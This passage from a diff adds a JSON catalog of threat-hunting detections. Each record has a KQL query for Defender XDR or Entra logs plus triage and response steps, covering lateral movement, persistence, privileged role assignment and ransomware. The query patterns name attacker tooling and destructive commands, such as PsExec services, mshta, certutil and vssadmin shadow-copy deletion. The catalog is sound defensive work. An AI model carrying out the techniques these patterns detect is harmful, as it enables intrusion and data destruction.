+      "response": "Remove the assigned privileged role immediately via Entra ID, disable the target account, and audit all activities performed by both accounts in the preceding 48 hours.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1098.003 Account Manipulation - Additional Cloud Roles",
+          "url": "https://attack.mitre.org/techniques/T1098/003/"
+        },
+        {
+          "title": "Microsoft Entra Audit Activity Reference",
+          "url": "https://learn.microsoft.com/en-us/entra/identity/monitoring-health/reference-audit-activities"
+        }
+      ],
+      "query": "// HB-ID-006 | T1098.003 | Highly privileged directory role assigned in Entra ID\n// Hypothesis: An attacker assigns Global Administrator or other sensitive directory roles to a rogue account to solidify persistence and tenant-wide control.\nlet lookback = 7d;\nAuditLogs\n| where TimeGenerated > ago(lookback)\n| where Category =~ \"RoleManagement\"\n| where OperationName in~ (\n    \"Add member to role\",\n    \"Add eligible member to role\",\n    \"Add member to role in PIM completed\"\n)\n| where Result =~ \"success\"\n| extend RoleName = tostring(TargetResources[0].modifiedProperties[1].newValue)\n| extend TargetUser = tostring(TargetResources[0].userPrincipalName)\n| extend Actor = tostring(InitiatedBy.user.userPrincipalName)\n| where RoleName has_any (\n    \"Global Administrator\",\n    \"Privileged Role Administrator\",\n    \"Security Administrator\",\n    \"Exchange Administrator\",\n    \"User Administrator\"\n)\n| project\n    TimeGenerated,\n    OperationName,\n    RoleName,\n    TargetUser,\n    Actor,\n    ResultDescription,\n    TargetResources\n| order by TimeGenerated desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-LM-001",
+      "title": "RDP lateral movement fan-out to multiple internal endpoints",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "DeviceLogonEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "lateral-movement"
+        ],
+        "techniques": [
+          "T1021.001"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An adversary with valid credentials utilizes Remote Desktop Protocol (RDP) to rapidly access and compromise multiple endpoints across the corporate network from a single staging system.\n",
+      "logic_summary": "Aggregates successful RemoteInteractive (RDP) logons from DeviceLogonEvents grouped by source IP and account in 2-hour windows, alerting when connections fan out to 4 or more distinct target hostnames.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "3d",
+          "description": "Historical search window to inspect"
+        },
+        {
+          "name": "window",
+          "default": "2h",
+          "description": "Tumbling time bucket window for grouping RDP sessions"
+        },
+        {
+          "name": "minHosts",
+          "default": 4,
+          "description": "Minimum number of unique target endpoints accessed"
+        }
+      ],
+      "false_positives": [
+        "Centralized IT administrative jump boxes / bastion hosts used by authorized helpdesk technicians",
+        "Automated enterprise vulnerability management or patch deployment scanners"
+      ],
+      "tuning": [
+        "Whitelist dedicated corporate Privileged Access Workstations (PAWs) and jump hosts by RemoteIP",
+        "Raise minHosts threshold if system administrators legitimately connect to multiple servers concurrently"
+      ],
+      "triage_steps": [
+        "Verify whether the AccountName belongs to an authorized IT systems administrator",
+        "Identify the RemoteIP and examine telemetry on the source machine for evidence of prior malware infection",
+        "Check what commands were executed on the target endpoints immediately following the RDP sessions"
+      ],
+      "response": "Isolate the source workstation, terminate active RDP sessions across all affected targets, and temporarily disable the compromised user account pending credential rotation.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1021.001 Remote Services - Remote Desktop Protocol",
+          "url": "https://attack.mitre.org/techniques/T1021/001/"
+        },
+        {
+          "title": "Microsoft Defender Advanced Hunting DeviceLogonEvents",
+          "url": "https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicelogonevents-table"
+        }
+      ],
+      "query": "// HB-LM-001 | T1021.001 | RDP lateral movement fan-out to multiple internal endpoints\n// Hypothesis: An attacker uses Remote Desktop Protocol (RDP) from a single compromised internal host to fan out and log into multiple target machines across the network.\nlet lookback = 3d;\nlet window = 2h;\nlet minHosts = 4;\nDeviceLogonEvents\n| where Timestamp > ago(lookback)\n| where ActionType =~ \"LogonSuccess\"\n| where LogonType =~ \"RemoteInteractive\"\n| where isnotempty(RemoteIP)\n| summarize\n    TargetHostsCount = dcount(DeviceName),\n    TargetHosts = make_set(DeviceName, 10),\n    FirstLogon = min(Timestamp),\n    LastLogon = max(Timestamp)\n    by RemoteIP, RemoteDeviceName, AccountName, bin(Timestamp, window)\n| where TargetHostsCount >= minHosts\n| project\n    Timestamp,\n    RemoteIP,\n    RemoteDeviceName,\n    AccountName,\n    TargetHostsCount,\n    TargetHosts,\n    FirstLogon,\n    LastLogon\n| order by TargetHostsCount desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-LM-002",
+      "title": "Remote service or PsExec-like execution spawned by services.exe",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "DeviceProcessEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "lateral-movement",
+          "execution"
+        ],
+        "techniques": [
+          "T1569.002"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An adversary moves laterally by using PsExec or remote service creation tools to execute interactive shells or payload binaries on remote systems spawned directly by services.exe.\n",
+      "logic_summary": "Filters DeviceProcessEvents for known remote execution service wrappers (psexesvc, paexec) or instances where the Windows Service Control Manager (services.exe) directly spawns an interactive shell.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Legitimate IT remote administration batch scripts utilizing Sysinternals PsExec",
+        "Enterprise monitoring or remote management and maintenance (RMM) software agents"
+      ],
+      "tuning": [
+        "Allow-list approved administrative automation tools executed exclusively by designated domain admin service accounts",
+        "Correlate with DeviceNetworkEvents to verify incoming SMB connections on port 445"
+      ],
+      "triage_steps": [
+        "Inspect ProcessCommandLine to see what commands or secondary scripts were executed",
+        "Identify the source machine that initiated the remote service via network and logon telemetry",
+        "Check whether the user account executing the command has authorized administrative permissions"
+      ],
+      "response": "Terminate the remote process, disable the compromised administrative account, isolate the target machine, and inspect the originating system for primary infection vectors.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1569.002 System Services - Service Execution",
+          "url": "https://attack.mitre.org/techniques/T1569/002/"
+        },
+        {
+          "title": "Microsoft Defender Advanced Hunting DeviceProcessEvents",
+          "url": "https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table"
+        }
+      ],
+      "query": "// HB-LM-002 | T1569.002 | Remote service or PsExec-like execution spawned by services.exe\n// Hypothesis: An attacker uses PsExec, PaExec, or remote service installation to spawn command shells on remote endpoints for lateral movement.\nlet lookback = 7d;\nDeviceProcessEvents\n| where Timestamp > ago(lookback)\n| where FileName in~ (\"psexesvc.exe\", \"paexec.exe\", \"winexesvc.exe\", \"remotesvc.exe\")\n     or (InitiatingProcessFileName =~ \"services.exe\" and FileName in~ (\"cmd.exe\", \"powershell.exe\", \"pwsh.exe\", \"mshta.exe\"))\n| project\n    Timestamp,\n    DeviceName,\n    AccountName,\n    FileName,\n    ProcessCommandLine,\n    InitiatingProcessFileName,\n    InitiatingProcessCommandLine,\n    ProcessIntegrityLevel\n| order by Timestamp desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-LM-003",
+      "title": "SMB admin share access fan-out to multiple internal hosts",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "DeviceNetworkEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "lateral-movement"
+        ],
+        "techniques": [
+          "T1021.002"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An adversary who has compromised internal administrative credentials uses SMB (TCP port 445) to connect to multiple target machines in rapid succession to stage payloads or execute remote tasks.\n",
+      "logic_summary": "Aggregates successful outbound connections on port 445 from DeviceNetworkEvents grouped by source host and initiating process in 1-hour windows, alerting when connections reach 5 or more distinct internal IPs.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "3d",
+          "description": "Historical search window to inspect"
+        },
+        {
+          "name": "window",
+          "default": "1h",
+          "description": "Tumbling time bucket window"
+        },
+        {
+          "name": "minTargets",
+          "default": 5,
+          "description": "Minimum number of unique target IPs on port 445"
+        }
+      ],
+      "false_positives": [
+        "Enterprise vulnerability management scanners (Nessus, Qualys) performing authenticated credentialed scans",
+        "Centralized domain file servers or automated backup servers communicating with endpoints"
+      ],
+      "tuning": [
+        "Whitelist verified corporate vulnerability scanner IP addresses using a Sentinel watchlist",
+        "Exclude trusted domain controller replication and dedicated enterprise file servers"
+      ],
+      "triage_steps": [
+        "Identify the InitiatingProcessFileName and CommandLine on the source machine (e.g. net.exe, powershell.exe, impacket)",
+        "Inspect target machines for corresponding 4624/4672 logon events or remote service creations",
+        "Check whether the user account has legitimate administrative responsibilities over all targeted endpoints"
+      ],
+      "response": "Isolate the source endpoint via Defender for Endpoint API, block outbound SMB lateral movement, and rotate passwords for the affected administrative account.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1021.002 Remote Services - SMB/Windows Admin Shares",
+          "url": "https://attack.mitre.org/techniques/T1021/002/"
+        },
+        {
+          "title": "Microsoft Defender Advanced Hunting DeviceNetworkEvents",
+          "url": "https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table"
+        }
+      ],
+      "query": "// HB-LM-003 | T1021.002 | SMB admin share access fan-out to multiple internal hosts\n// Hypothesis: An attacker uses SMB (port 445) to connect to admin shares (C$, ADMIN$) across multiple systems for lateral movement or staging.\nlet lookback = 3d;\nlet window = 1h;\nlet minTargets = 5;\nDeviceNetworkEvents\n| where Timestamp > ago(lookback)\n| where ActionType =~ \"ConnectionSuccess\"\n| where RemotePort == 445\n| summarize\n    DistinctTargets = dcount(RemoteIP),\n    TargetIPs = make_set(RemoteIP, 10),\n    FirstConnection = min(Timestamp),\n    LastConnection = max(Timestamp)\n    by DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, bin(Timestamp, window)\n| where DistinctTargets >= minTargets\n| project\n    Timestamp,\n    SourceDevice = DeviceName,\n    InitiatingProcessFileName,\n    InitiatingProcessAccountName,\n    DistinctTargets,\n    TargetIPs,\n    FirstConnection,\n    LastConnection\n| order by DistinctTargets desc\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-PS-001",
+      "title": "Persistence via Windows registry Run or RunOnce keys",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "DeviceRegistryEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "persistence"
+        ],
+        "techniques": [
+          "T1547.001"
+        ]
+      },
+      "severity": "medium",
+      "hypothesis": "An adversary creates or modifies values under the Run or RunOnce registry keys pointing to a script engine or untrusted directory so that their malware maintains persistence across system reboots or user logons.\n",
+      "logic_summary": "Monitors DeviceRegistryEvents for RegistryValueSet operations targeting CurrentVersion\\Run or RunOnce where the stored command value references suspicious scripting interpreters or staging directories.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Legitimate enterprise software updates or new software installations adding auto-start launchers",
+        "Antivirus or VPN client updater binaries writing to ProgramData"
+      ],
+      "tuning": [
+        "Allow-list approved vendor executable paths located strictly under C:\\Program Files or C:\\Program Files (x86)",
+        "Filter out trusted administrative install processes such as msiexec.exe when initiating process signer is trusted"
+      ],
+      "triage_steps": [
+        "Inspect RegistryValueData to see the exact binary or command line scheduled for auto-run",
+        "Verify if the file exists on disk and calculate its SHA256 hash using DeviceFileEvents",
+        "Determine if the InitiatingProcess was an interactive user shell or an unexpected process"
+      ],
+      "response": "Delete the malicious registry value, remove the referenced executable from disk, and perform a full host scan.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1547.001 Boot or Logon Autostart Execution - Registry Run Keys / Startup Folder",
+          "url": "https://attack.mitre.org/techniques/T1547/001/"
+        },
+        {
+          "title": "Microsoft Defender Advanced Hunting DeviceRegistryEvents",
+          "url": "https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceregistryevents-table"
+        }
+      ],
+      "query": "// HB-PS-001 | T1547.001 | Persistence via Windows registry Run or RunOnce keys\n// Hypothesis: An attacker establishes persistence by modifying registry Run/RunOnce keys so their payload executes upon user logon.\nlet lookback = 7d;\nDeviceRegistryEvents\n| where Timestamp > ago(lookback)\n| where ActionType =~ \"RegistryValueSet\"\n| where RegistryKey has_any (\n    @\"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\",\n    @\"\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\n)\n| where RegistryValueData has_any (\n    \"powershell\", \"cmd.exe\", \"wscript\", \"cscript\", \"mshta\", \"rundll32\", \"regsvr32\",\n    @\"\\AppData\\Local\\Temp\", @\"\\Users\\Public\\\", @\"C:\\ProgramData\\\"\n)\n| project\n    Timestamp,\n    DeviceName,\n    RegistryKey,\n    RegistryValueName,\n    RegistryValueData,\n    PreviousRegistryValueData,\n    InitiatingProcessFileName,\n    InitiatingProcessCommandLine,\n    InitiatingProcessAccountName\n| order by Timestamp desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-PS-002",
+      "title": "Scheduled task created by uncommon parent process",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "DeviceProcessEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "persistence",
+          "execution"
+        ],
+        "techniques": [
+          "T1053.005"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An adversary creates a Windows scheduled task via schtasks.exe spawned from an interactive shell, script interpreter, or Office application to establish persistent execution or schedule lateral movement.\n",
+      "logic_summary": "Detects process creation of schtasks.exe with /create in its arguments where the parent initiating process is a shell, script host, or office document rather than typical system installation binaries.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Enterprise deployment scripts or IT automation batch files executing schtasks /create during software rollouts",
+        "Developer environment scripts setting up local recurring background jobs"
+      ],
+      "tuning": [
+        "Whitelist approved administrative IT deployment batch scripts executed from dedicated management shares",
+        "Require elevated integrity level or filter by specific task paths (e.g. tasks created under \\Microsoft\\Windows\\)"
+      ],
+      "triage_steps": [
+        "Analyze ProcessCommandLine to extract the scheduled task name (/tn), binary path (/tr), and frequency (/sc)",
+        "Inspect the task action payload to determine if it downloads a remote script or launches a malicious executable",
+        "Correlate with InitiatingProcessCommandLine to see how the parent shell received the command"
+      ],
+      "response": "Delete the rogue scheduled task using schtasks /delete /tn <TaskName> /f, remove the associated payload from disk, and isolate the host for forensic imaging.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1053.005 Scheduled Task/Job - Scheduled Task",
+          "url": "https://attack.mitre.org/techniques/T1053/005/"
+        },
+        {
+          "title": "Microsoft Defender Advanced Hunting DeviceProcessEvents",
+          "url": "https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table"
+        }
+      ],
+      "query": "// HB-PS-002 | T1053.005 | Scheduled task created by uncommon parent process\n// Hypothesis: An attacker uses schtasks.exe to establish persistence or execute delayed tasks, spawned from a command-line script or office document.\nlet lookback = 7d;\nDeviceProcessEvents\n| where Timestamp > ago(lookback)\n| where FileName =~ \"schtasks.exe\"\n| where ProcessCommandLine has_any (\"/create\", \"-create\")\n| where InitiatingProcessFileName in~ (\n    \"powershell.exe\", \"pwsh.exe\", \"cmd.exe\", \"wscript.exe\", \"cscript.exe\",\n    \"winword.exe\", \"excel.exe\", \"mshta.exe\", \"rundll32.exe\"\n)\n| project\n    Timestamp,\n    DeviceName,\n    AccountName,\n    ProcessCommandLine,\n    InitiatingProcessFileName,\n    InitiatingProcessCommandLine,\n    InitiatingProcessParentFileName,\n    ProcessIntegrityLevel\n| order by Timestamp desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-PS-003",
+      "title": "New Windows service installed pointing to untrusted path",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "DeviceEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "persistence",
+          "privilege-escalation"
+        ],
+        "techniques": [
+          "T1543.003"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An adversary creates a new Windows service executing binaries from user-writable directories or invoking script interpreters to gain persistent, elevated execution as NT AUTHORITY\\SYSTEM.\n",
+      "logic_summary": "Searches DeviceEvents for ServiceInstalled events where the installed service binary path resides in staging directories (AppData, Temp, Users\\Public, ProgramData) or references script engines.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Legitimate enterprise applications installing background helper services in ProgramData (e.g. Chrome / Edge update services)",
+        "Developer tooling creating local debugging or microservice instances"
+      ],
+      "tuning": [
+        "Whitelist digitally signed executables from trusted software vendors",
+        "Suppress services created during scheduled software deployment maintenance windows"
+      ],
+      "triage_steps": [
+        "Inspect the ServiceFileName and ServiceName to determine the purpose and origin of the binary",
+        "Check the binary SHA256 hash against threat intelligence databases using DeviceFileEvents",
+        "Identify which account and process created the service"
+      ],
+      "response": "Stop and delete the malicious service (sc.exe stop <ServiceName> && sc.exe delete <ServiceName>), remove the binary, and inspect the endpoint for lateral movement activity.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1543.003 Create or Modify System Process - Windows Service",
+          "url": "https://attack.mitre.org/techniques/T1543/003/"
+        },
+        {
+          "title": "Microsoft Defender Advanced Hunting DeviceEvents",
+          "url": "https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceevents-table"
+        }
+      ],
+      "query": "// HB-PS-003 | T1543.003 | New Windows service installed pointing to untrusted path\n// Hypothesis: An attacker installs a rogue Windows service to establish persistence with SYSTEM-level execution privileges.\nlet lookback = 7d;\nDeviceEvents\n| where Timestamp > ago(lookback)\n| where ActionType =~ \"ServiceInstalled\"\n| extend ServiceName = tostring(AdditionalFields.ServiceName)\n| extend ServiceFileName = tostring(AdditionalFields.ServiceFileName)\n| where ServiceFileName has_any (\n    @\"\\AppData\\\", @\"\\Temp\\\", @\"\\Users\\Public\\\", @\"C:\\ProgramData\\\",\n    \"powershell\", \"cmd.exe\", \"mshta\", \"rundll32\", \"certutil\"\n)\n| project\n    Timestamp,\n    DeviceName,\n    AccountName,\n    ServiceName,\n    ServiceFileName,\n    InitiatingProcessFileName,\n    InitiatingProcessCommandLine\n| order by Timestamp desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-PS-004",
+      "title": "WMI Event Subscription Persistence",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "DeviceEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "persistence",
+          "privilege-escalation"
+        ],
+        "techniques": [
+          "T1546.003"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An adversary creates a permanent Windows Management Instrumentation (WMI) event filter and consumer binding to establish stealthy persistence, executing malicious code with SYSTEM privileges whenever target system events fire.\n",
+      "logic_summary": "Inspects DeviceEvents for WMI subscription creation actions (WmiEventFilterCreated, WmiEventConsumerCreated, WmiEventConsumerToFilterCreated), parsing consumer names, trigger queries, and initiating process telemetry.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "14d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Enterprise endpoint management agents (e.g. SCCM/MECM, Dell Command, HP Support Assistant) registering health filters",
+        "Antivirus and EDR software maintaining local system state watchdogs"
+      ],
+      "tuning": [
+        "Whitelist known IT management consumer names matching verified vendor binaries",
+        "Suppress benign OEM hardware telemetry monitors signed by trusted root certificates"
+      ],
+      "triage_steps": [
+        "Inspect the CommandLine and Query within AdditionalFields to identify the payload or script being executed",
+        "Determine whether the Consumer is a CommandLineEventConsumer (runs an EXE/script) or ActiveScriptEventConsumer (executes VBScript/JScript)",
+        "Trace the InitiatingProcessCommandLine that installed the subscription (e.g. wmic.exe, powershell.exe, or mofcomp.exe)",
+        "Check the device for persistence removal using Get-CimInstance -Namespace root\\subscription"
+      ],
+      "response": "Remove the malicious WMI filter, consumer, and binding objects via PowerShell CIM commands, isolate the infected host, and conduct memory and disk forensic analysis.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1546.003 WMI Event Subscription",
+          "url": "https://attack.mitre.org/techniques/T1546/003/"
+        },
+        {
+          "title": "Microsoft Defender for Endpoint DeviceEvents Reference",
+          "url": "https://learn.microsoft.com/en-us/microsoft-365/security/defender/advanced-hunting-deviceevents-table"
+        }
+      ],
+      "query": "// Hunt: HB-PS-004 - WMI Event Subscription Persistence\n// MITRE ATT&CK: T1546.003 (Event Triggered Execution: Windows Management Instrumentation Event Subscription)\n// Platform: Microsoft Defender XDR (DeviceEvents)\n//\n// Description: Detects the creation of permanent WMI event filters, consumers, and bindings.\n// Adversaries establish WMI subscriptions to maintain stealthy persistence and execute malicious code\n// upon specific OS triggers (e.g., system startup, network connection, user logon).\n\nlet lookback = 14d;\nlet wmiActions = dynamic([\n    \"WmiEventConsumerCreated\",\n    \"WmiEventFilterCreated\",\n    \"WmiEventConsumerToFilterCreated\"\n]);\nDeviceEvents\n| where Timestamp > ago(lookback)\n| where ActionType in~ (wmiActions) or ActionType has \"WmiEvent\"\n| extend ConsumerName = tostring(AdditionalFields.ConsumerName)\n| extend FilterName = tostring(AdditionalFields.FilterName)\n| extend Query = tostring(AdditionalFields.Query)\n| project Timestamp, DeviceName, ActionType, ConsumerName, FilterName, Query,\n          InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName, AdditionalFields\n| order by Timestamp desc\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-RW-001",
+      "title": "Volume Shadow Copy deletion and system recovery inhibition",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "DeviceProcessEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "impact",
+          "defense-evasion"
+        ],
+        "techniques": [
+          "T1490"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An active ransomware operator or automated ransomware payload inhibits system recovery by purging Volume Shadow Copies and system backups via vssadmin, wmic, or bcdedit immediately prior to encrypting files.\n",
+      "logic_summary": "Scans DeviceProcessEvents for invocations of native recovery utilities (vssadmin, wmic, wbadmin, bcdedit, PowerShell) with command-line switches specifically targeting shadow copy deletion, catalog removal, or boot recovery disabling.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "3d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Rare legitimate disk management operations or proprietary enterprise backup agents that clean up temporary snapshots",
+        "Operating system re-imaging scripts running in dedicated staging environments"
+      ],
+      "tuning": [
+        "Allow-list approved enterprise backup agent service binaries (e.g. Veeam, Commvault) if they utilize vssadmin with strict parent process validation",
+        "Exclude lab environments dedicated to OS image deployment"
+      ],
+      "triage_steps": [
+        "Treat as a critical P1 incident: immediately check if multiple endpoints are exhibiting this behavior concurrently",
+        "Review DeviceFileEvents for mass file renaming, file drops with unusual extensions (.lockbit, .blackcat), or ransom notes",
+        "Inspect InitiatingProcessFileName and CommandLine to find the parent process or malware loader responsible"
+      ],
+      "response": "Immediately isolate the host from the network using Defender for Endpoint API, trigger an automated investigation, and page the incident response on-call team to contain potential lateral ransomware spreading.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1490 Inhibit System Recovery",
+          "url": "https://attack.mitre.org/techniques/T1490/"
+        },
+        {
+          "title": "Microsoft Defender Threat Analytics - Ransomware Defense",
+          "url": "https://learn.microsoft.com/en-us/defender-xdr/threat-analytics"
+        }
+      ],
+      "query": "// HB-RW-001 | T1490 | Volume Shadow Copy deletion and system recovery inhibition\n// Hypothesis: Ransomware or a destructive attacker deletes Volume Shadow Copies and disables Windows recovery options to prevent file restoration prior to encryption.\nlet lookback = 3d;\nDeviceProcessEvents\n| where Timestamp > ago(lookback)\n| where (FileName =~ \"vssadmin.exe\" and ProcessCommandLine has_all (\"delete\", \"shadows\"))\n     or (FileName =~ \"wmic.exe\" and ProcessCommandLine has_all (\"shadowcopy\", \"delete\"))\n     or (FileName =~ \"wbadmin.exe\" and ProcessCommandLine has_all (\"delete\", \"catalog\"))\n     or (FileName =~ \"bcdedit.exe\" and ProcessCommandLine has_any (\"recoveryenabled\", \"bootstatuspolicy\"))\n     or (FileName in~ (\"powershell.exe\", \"pwsh.exe\") and ProcessCommandLine has_any (\"Delete-WmiObject\", \"Win32_ShadowCopy\"))\n| project\n    Timestamp,\n    DeviceName,\n    AccountName,\n    FileName,\n    ProcessCommandLine,\n    InitiatingProcessFileName,\n    InitiatingProcessCommandLine,\n    InitiatingProcessParentFileName,\n    ProcessIntegrityLevel\n| order by Timestamp desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-RW-002",
+      "title": "Ransomware Mass File Rename with Encrypted Extension",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "DeviceFileEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "impact"
+        ],
+        "techniques": [
+          "T1486"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "A ransomware binary is actively encrypting files across user documents and network shares, renaming files in rapid succession and appending known encryption extensions (.locked, .crypted, .enc) to render data unusable.\n",
+      "logic_summary": "Monitors DeviceFileEvents for FileRenamed operations, detecting rapid bursts exceeding 20 file renames within 10 minutes where original extensions change or match known ransomware extension patterns.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "24h",
+          "description": "Historical search window to inspect"
+        },
+        {
+          "name": "burstWindow",
+          "default": "10m",
+          "description": "Aggregation window for burst detection"
+        },
+        {
+          "name": "renameThreshold",
+          "default": 20,
+          "description": "Minimum number of renamed files within the window"
+        }
+      ],
+      "false_positives": [
+        "Software installation or patch update routines creating temporary backup files",
+        "Developer batch build scripts or archive compression utilities renaming build artifacts"
+      ],
+      "tuning": [
+        "Exclude verified enterprise backup utilities and source code compilers (e.g. devenv.exe, msbuild.exe)",
+        "Adjust renameThreshold upward if large legitimate data migration jobs frequently run"
+      ],
+      "triage_steps": [
+        "Inspect InitiatingProcessFileName and InitiatingProcessCommandLine to identify the encrypting binary or script",
+        "Examine SampleNewFiles to determine whether a ransom note (e.g. README.txt, HOW_TO_DECRYPT.txt) was dropped nearby",
+        "Immediately check if other hosts on the same network subnet are reporting similar mass rename bursts",
+        "Review DeviceNetworkEvents from the source process for outbound command-and-control communication"
+      ],
+      "response": "Immediately isolate the host from the network via Defender for Endpoint portal, kill the initiating process tree, preserve volatile RAM and disk forensic artifacts, and begin recovery from off-site immutable backups.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1486 Data Encrypted for Impact",
+          "url": "https://attack.mitre.org/techniques/T1486/"
+        },
+        {
+          "title": "Microsoft Incident Response Ransomware Playbook",
+          "url": "https://learn.microsoft.com/en-us/security/compass/human-operated-ransomware"
+        }
+      ],
+      "query": "// Hunt: HB-RW-002 - Ransomware Mass File Rename with Encrypted Extension\n// MITRE ATT&CK: T1486 (Data Encrypted for Impact)\n// Platform: Microsoft Defender XDR (DeviceFileEvents)\n//\n// Description: Detects a rapid burst of file rename operations where files are appended with\n// suspicious extensions or mass-renamed by a single process, indicative of active ransomware encryption.\n\nlet lookback = 24h;\nlet burstWindow = 10m;\nlet renameThreshold = 20;\nlet knownRansomExts = dynamic([\n    \".locked\", \".lockbit\", \".crypted\", \".crypto\", \".enc\", \".wnry\", \".payme\",\n    \".ransom\", \".blackcat\", \".alphv\", \".hive\", \".mallox\", \".stop\", \".djvu\"\n]);\nDeviceFileEvents\n| where Timestamp > ago(lookback)\n| where ActionType == \"FileRenamed\"\n| extend CurrentExt = tostring(split(FileName, \".\")[-1])\n| extend PrevExt = tostring(split(PreviousFileName, \".\")[-1])\n| where CurrentExt != PrevExt\n| where FileName has_any (knownRansomExts) or isnotempty(CurrentExt)\n| summarize \n    FirstRename = min(Timestamp),\n    LastRename = max(Timestamp),\n    RenameCount = count(),\n    SampleNewFiles = make_set(FileName, 5),\n    SampleOldFiles = make_set(PreviousFileName, 5),\n    TargetFolders = make_set(FolderPath, 5)\n    by DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName, bin(Timestamp, burstWindow)\n| where RenameCount >= renameThreshold\n| extend DurationSeconds = datetime_diff('second', LastRename, FirstRename)\n| project FirstRename, LastRename, DurationSeconds, DeviceName, InitiatingProcessFileName,\n          InitiatingProcessAccountName, RenameCount, SampleNewFiles, SampleOldFiles, TargetFolders, InitiatingProcessCommandLine\n| order by RenameCount desc\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-RW-003",
+      "title": "Safe-Mode or Boot Recovery Disabled via Bcdedit",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "DeviceProcessEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "impact",
+          "defense-evasion"
+        ],
+        "techniques": [
+          "T1490"
+        ]
+      },
+      "severity": "high",
